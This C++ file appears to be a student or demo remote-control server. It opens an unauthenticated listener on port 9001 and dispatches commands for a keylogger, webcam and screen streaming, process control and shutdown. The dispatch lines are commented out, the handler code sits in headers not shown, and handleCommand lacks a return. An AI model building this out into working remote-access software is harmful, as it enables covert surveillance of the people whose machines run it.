#include <iostream>
#include <string>
#include <thread>
#include <cstring>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
    typedef int SOCKET;
    typedef struct sockaddr_in SOCKADDR_IN;
    typedef struct sockaddr SOCKADDR;
#endif

#include "process_list_start_stop.h"
#include "screenshot.h"
#include "webcam.h"
#include "shutdown.h"
#include "keylogger.h"
#include "app_list_start_stop.h"

std::string handleCommand(const std::string &cmd) {
    // ===== PROCESS COMMANDS ===== (chuy phần này sang code để chạy demo)
    //if (cmd == "process_list") return listProcesses();
    //if (cmd.find("start_process ") == 0) {
    //    std::string proc = cmd.substr(13);
    //    return startProcess(proc);
    //}
    //if (cmd.find("stop_process ") == 0) {
    //    int pid = std::stoi(cmd.substr(12));
    //    return stopProcess(pid);
    //}
    
    // ===== APP COMMANDS =====
    //if (cmd == "list_apps") return listApps();
    //if (cmd.find("start_app ") == 0) {
    //    std::string app = cmd.substr(10);
    //    return startApp(app);
    //}
    //if (cmd.find("stop_app ") == 0) {
    //    std::string app = cmd.substr(9);
    //    return stopApp(app);
    //}
    
    // ===== SCREENSHOT =====
    //if (cmd == "screenshot") return takeScreenshot();
    //if (cmd == "screen_stream_start") return screenStreamStart();
    //if (cmd == "screen_stream_stop") return screenStreamStop();

    
    // ===== WEBCAM COMMANDS =====
    //if (cmd == "webcam") return webcamStart();
    //if (cmd == "webcam_stop") return webcamStop();
    //if (cmd == "webcam_capture") return webcamCapture();
    //if (cmd == "webcam_record") return webcamRecordVideo(15);
    //if (cmd == "webcam_stream_start") return webcamStreamStart();
    //if (cmd == "webcam_stream_stop") return webcamStreamStop();
        
    // ===== KEYLOGGER =====
    //if (cmd == "keylogger_start") return keyloggerStart();
    //if (cmd == "keylogger_stop") return keyloggerStop();
    //if (cmd == "keylogger_get") return keyloggerGetLogs();
    
    // ===== SHUTDOWN =====
    //if (cmd == "shutdown") {
    //    shutdownMachine();
    //    return "✓ Shutdown initiated";
    //}
    //if (cmd == "restart") {
    //    restartMachine();
    //    return "✓ Restart initiated";
    //}
    
}


int main() {
    try {
#ifdef _WIN32
        WSADATA wsaData;
        int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (result != 0) {
            std::cerr << "[SERVER] WSAStartup failed: " << result << "\n";
            return 1;
        }
#endif

        // Create socket
        SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSocket == INVALID_SOCKET) {
            std::cerr << "[SERVER] Socket creation failed\n";
            return 1;
        }

        // Setup server address
        SOCKADDR_IN serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = inet_addr("0.0.0.0");
        serverAddr.sin_port = htons(9001);

        // Bind socket
        if (bind(listenSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "[SERVER] Bind failed\n";
            closesocket(listenSocket);
            return 1;
        }

        // Listen
        if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
            std::cerr << "[SERVER] Listen failed\n";
            closesocket(listenSocket);
            return 1;
        }

        std::cout << "[SERVER] Listening on port 9001\n";

        // Accept single client
        SOCKADDR_IN clientAddr;
        socklen_t clientAddrLen = sizeof(clientAddr);
        
        SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "[SERVER] Accept failed\n";
            return 1;
        }

        std::cout << "[SERVER] Client connected\n";

        // Handle client (no thread, single connection)
        try {
            char buffer[4096];
            int bytesReceived;

            while (true) {
                // Receive command
                bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                if (bytesReceived <= 0) break;

                // Null-terminate
                buffer[bytesReceived] = '\0';
                std::string cmd(buffer);

                // Remove newline
                if (!cmd.empty() && cmd.back() == '\n') {
                    cmd.pop_back();
                }

                std::cout << "[SERVER] Received: " << cmd << "\n";

                // Handle command
                std::string response = handleCommand(cmd);
                response += "\n";

                // Send response
                send(clientSocket, response.c_str(), response.length(), 0);
            }
        } catch (std::exception &e) {
            std::cerr << "[SERVER] Error: " << e.what() << "\n";
        }

        closesocket(clientSocket);
        std::cout << "[SERVER] Client disconnected\n";

        closesocket(listenSocket);

#ifdef _WIN32
        WSACleanup();
#endif

    } catch (std::exception &e) {
        std::cerr << "[SERVER] Exception: " << e.what() << "\n";
    }

    return 0;
}
